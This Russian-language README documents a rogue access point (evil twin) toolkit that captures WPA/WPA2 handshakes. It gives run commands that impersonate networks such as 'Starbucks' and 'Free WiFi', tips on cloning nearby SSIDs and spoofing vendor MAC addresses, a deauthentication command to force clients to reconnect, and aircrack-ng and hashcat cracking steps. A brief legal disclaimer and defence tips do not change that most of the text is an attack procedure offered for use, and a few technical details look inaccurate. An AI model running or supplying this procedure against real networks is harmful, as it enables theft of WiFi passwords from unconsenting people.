# WiFi Fake AP & Handshake Catcher

Набор инструментов для создания фейковой точки доступа WiFi и перехвата WPA/WPA2 handshake.

## ⚠️ ВАЖНО: Легальное использование

**Эти инструменты предназначены только для:**
- Тестирования безопасности собственных сетей
- Легальных пентестов с письменным разрешением
- Образовательных целей в контролируемой среде

**Незаконное использование преследуется по закону!**

## Описание скриптов

### 🔥 РЕКОМЕНДУЕТСЯ: Версии БЕЗ Monitor Mode

#### `fake_ap_with_capture.py` - ⭐ ЛУЧШИЙ ВЫБОР

**Работает на ЛЮБОМ WiFi адаптере, включая встроенный Raspberry Pi!**

Создает точку доступа и перехватывает WPA handshake БЕЗ режима монитора.

**Возможности:**
- ✅ Работает на встроенном WiFi Raspberry Pi 3/4/5
- ✅ Не требует специального USB адаптера
- ✅ Создает точку доступа с произвольным SSID
- ✅ Перехватывает WPA handshake (EAPOL пакеты)
- ✅ Сохраняет в .pcap для aircrack-ng/hashcat
- ✅ Детальное логирование всех попыток подключения

**Требования:**
- Любой WiFi адаптер с поддержкой AP mode (почти все)
- hostapd
- tcpdump
- Права root

#### `simple_ap_no_monitor.py` - Упрощенная версия

Простая точка доступа с логированием подключений.

**Возможности:**
- Создание точки доступа
- Логирование попыток подключения
- Определение неудачных попыток (неверный пароль)
- Простой и понятный код

**Требования:**
- hostapd
- Права root

---

### Версии С Monitor Mode (требуют специальный адаптер)

#### 1. `fake_ap.py` - Полнофункциональная точка доступа

Создает фейковую WiFi точку доступа с заданным SSID и MAC адресом, перехватывает попытки подключения и сохраняет WPA handshake.

**Возможности:**
- Создание точки доступа с произвольным SSID
- Установка произвольного MAC адреса
- Выбор канала WiFi
- Автоматический перехват handshake
- Сохранение в формате .cap и .hccapx (для hashcat)
- Подробное логирование

**Требования:**
- Linux (Kali Linux, Ubuntu, Raspberry Pi OS)
- aircrack-ng suite
- hostapd
- WiFi адаптер с поддержкой monitor mode (см. HOW_TO_IDENTIFY_V1.md)
- Права root

#### 2. `fake_ap_simple.py` - Упрощенный сниффер

Упрощенная версия для перехвата EAPOL пакетов (handshake) без создания точки доступа.

**Возможности:**
- Перехват EAPOL пакетов
- Сохранение в .pcap формат
- Извлечение информации о handshake
- Работает только с scapy

**Требования:**
- Python 3
- scapy
- Беспроводной адаптер в режиме монитора
- Права root

## Установка

### На Kali Linux

```bash
# Установка зависимостей
sudo apt update
sudo apt install -y aircrack-ng hostapd python3-scapy hcxtools

# Установка Python зависимостей
pip3 install scapy
```

### На Ubuntu/Debian

```bash
sudo apt update
sudo apt install -y aircrack-ng hostapd python3-pip
pip3 install scapy

# Опционально: hcxtools для конвертации в hashcat формат
sudo apt install hcxtools
```

### На Raspberry Pi

```bash
# Обновление системы
sudo apt update && sudo apt upgrade -y

# Установка пакетов
sudo apt install -y aircrack-ng hostapd python3-scapy hcxtools

# Права на выполнение
chmod +x fake_ap.py fake_ap_simple.py
```

## Использование

### ⭐ РЕКОМЕНДУЕТСЯ: БЕЗ Monitor Mode

#### Вариант A: С захватом handshake (fake_ap_with_capture.py)

**Работает на встроенном WiFi Raspberry Pi!**

```bash
# Базовое использование
sudo python3 fake_ap_with_capture.py <interface> <SSID> [password] [channel]

# Примеры
sudo python3 fake_ap_with_capture.py wlan0 "Free WiFi"
sudo python3 fake_ap_with_capture.py wlan0 "Starbucks" "test1234" 6
```

**Процесс работы:**
1. Создается точка доступа с заданным SSID
2. Запускается tcpdump для захвата EAPOL пакетов
3. При подключении клиента перехватывается handshake
4. Все сохраняется в .pcap файл

**Выходные файлы:**
- `captures/handshake_<SSID>_<timestamp>.pcap` - PCAP с handshake
- `captures/log_<SSID>_<timestamp>.txt` - подробный лог
- `captures/clients_<SSID>_<timestamp>.txt` - список клиентов

**Преимущества:**
- ✅ Не нужен специальный USB адаптер
- ✅ Работает на Raspberry Pi 3/4/5
- ✅ Полноценный захват handshake
- ✅ Совместимость с aircrack-ng и hashcat

#### Вариант B: Простое логирование (simple_ap_no_monitor.py)

```bash
sudo python3 simple_ap_no_monitor.py <interface> <SSID> [password] [channel]

# Пример
sudo python3 simple_ap_no_monitor.py wlan0 "Guest WiFi" "password123" 11
```

Создает точку доступа и логирует все попытки подключения, но не захватывает handshake в файл.

---

### С Monitor Mode (требуется специальный адаптер)

#### Вариант 1: Полная точка доступа (fake_ap.py)

```bash
# Базовое использование
sudo python3 fake_ap.py <interface> <SSID> <MAC_address> [channel]

# Примеры
sudo python3 fake_ap.py wlan0 "Free WiFi" 00:11:22:33:44:55 6
sudo python3 fake_ap.py wlan1 "Starbucks" AA:BB:CC:DD:EE:FF 11
```

**Параметры:**
- `interface` - WiFi интерфейс (wlan0, wlan1)
- `SSID` - название сети
- `MAC_address` - MAC адрес точки доступа
- `channel` - канал WiFi (опционально, по умолчанию 6)

**Процесс работы:**
1. Скрипт включит режим монитора на интерфейсе
2. Установит указанный MAC адрес
3. Создаст точку доступа с заданным SSID
4. Начнет перехват подключений
5. При получении handshake - сохранит в файл

**Выходные файлы:**
- `handshake_<SSID>_<timestamp>-01.cap` - capture файл
- `handshake_<SSID>_<timestamp>.hccapx` - формат hashcat
- `log_<SSID>_<timestamp>.txt` - лог событий

### Вариант 2: Упрощенный сниффер (fake_ap_simple.py)

```bash
# Сначала включите режим монитора
sudo airmon-ng start wlan0

# Запустите сниффер
sudo python3 fake_ap_simple.py wlan0mon "Target Network"

# С указанием директории для сохранения
sudo python3 fake_ap_simple.py wlan0mon "Free WiFi" ./captures
```

**Выходные файлы:**
- `captures/handshake_<SSID>_<timestamp>.pcap` - PCAP файл
- `captures/hashes_<SSID>_<timestamp>.txt` - текстовая информация
- `captures/log_<SSID>_<timestamp>.log` - лог

## Анализ перехваченных данных

### С помощью aircrack-ng

```bash
# Проверка наличия handshake
aircrack-ng handshake_*.cap

# Взлом с словарем
aircrack-ng -w /path/to/wordlist.txt handshake_*.cap
```

### С помощью hashcat

```bash
# Конвертация в формат hashcat (если нет .hccapx)
hcxpcaptool -o output.hccapx input.cap

# Взлом
hashcat -m 22000 output.hccapx wordlist.txt
```

## Как это работает

### WPA Handshake

При подключении к WiFi сети происходит "4-way handshake":

1. **Message 1**: AP → Client (ANonce)
2. **Message 2**: Client → AP (SNonce + MIC)
3. **Message 3**: AP → Client (подтверждение + GTK)
4. **Message 4**: Client → AP (подтверждение)

Для взлома достаточно перехватить **Message 2 и Message 3**, которые содержат хэши пароля.

### Процесс атаки

1. **Создание фейковой AP** - устройства видят знакомую сеть
2. **Попытка подключения** - клиент пытается подключиться
3. **Перехват handshake** - скрипт сохраняет EAPOL пакеты
4. **Оффлайн взлом** - хэш взламывается локально

## Структура перехваченных данных

### EAPOL пакет содержит:
- **BSSID** - MAC адрес точки доступа
- **Client MAC** - MAC адрес клиента
- **ANonce** - случайное число от AP
- **SNonce** - случайное число от клиента
- **MIC** (Message Integrity Check) - хэш на основе пароля

### Формат сохранения:

```
Timestamp: 2026-11-20T13:24:35
BSSID: 00:11:22:33:44:55
Source MAC: AA:BB:CC:DD:EE:FF
Destination MAC: 00:11:22:33:44:55
EAPOL Type: Key
Packet: [детали пакета]
```

## Рекомендации

### Выбор MAC адреса
- Используйте реалистичный MAC (начало указывает на производителя)
- Примеры префиксов:
  - `00:11:22:*` - Cimsys Inc
  - `00:1B:63:*` - Apple
  - `00:24:D7:*` - Hewlett Packard

### Выбор SSID
- Используйте популярные названия: "Free WiFi", "Guest", "Starbucks"
- Или клонируйте существующую сеть в радиусе

### Выбор канала
- Сканируйте каналы: `sudo airodump-ng wlan0mon`
- Используйте менее загруженный канал
- Популярные: 1, 6, 11

## Устранение проблем

### Ошибка: "Interface doesn't support monitor mode"
```bash
# Проверьте, поддерживает ли адаптер режим монитора
iw list | grep monitor

# Попробуйте другой драйвер
sudo airmon-ng check kill
```

### Ошибка: "hostapd не запускается"
```bash
# Остановите конфликтующие процессы
sudo airmon-ng check kill
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant
```

### Не перехватывается handshake
- Убедитесь, что клиент действительно подключается
- Проверьте, что канал совпадает
- Попробуйте деаутентификацию: `aireplay-ng -0 5 -a <BSSID> wlan0mon`

## Безопасность

### Защита от таких атак:
1. Используйте длинные сложные пароли (15+ символов)
2. Проверяйте MAC адрес точки доступа перед подключением
3. Используйте VPN при подключении к публичным сетям
4. Отключайте автоматическое подключение к WiFi

## Лицензия

Только для образовательных и легальных целей тестирования безопасности.

## Автор

Created with Claude Code
